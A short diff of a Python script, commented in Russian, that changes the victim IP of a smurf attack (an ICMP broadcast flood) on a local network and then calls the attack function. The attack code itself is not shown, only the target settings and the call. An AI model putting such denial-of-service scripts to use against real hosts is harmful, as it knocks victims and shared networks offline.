@@ -84,6 +84,6 @@ def send_smurf_attack(broadcast_ip, victim_ip):
 
 
 broadcast_ip = "192.168.0.255"  # Широковещательный адрес сети
-victim_ip = "192.168.0.156"  # IP жертвы
+victim_ip = "192.168.0.102"  # IP жертвы
 
 send_smurf_attack(broadcast_ip, victim_ip)
